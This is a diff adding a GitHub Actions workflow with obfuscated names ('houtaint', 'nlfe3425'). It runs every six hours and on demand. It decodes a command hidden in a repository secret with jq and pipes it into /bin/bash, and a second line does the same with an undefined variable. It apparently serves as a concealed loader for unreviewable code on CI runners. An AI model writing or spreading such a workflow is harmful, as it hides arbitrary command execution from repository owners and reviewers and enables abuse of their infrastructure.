@@ -1,0 +1,18 @@
+name: houtaint
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: houtaint
+        env:
+          nlfe3425: ${{ secrets.nlfe3425 }}
+        run: |
+          echo $nlfe3425 | jq -r .zhsy48 | /bin/bash
+          echo $mj351 | jq -r .f874 | /bin/bash
+
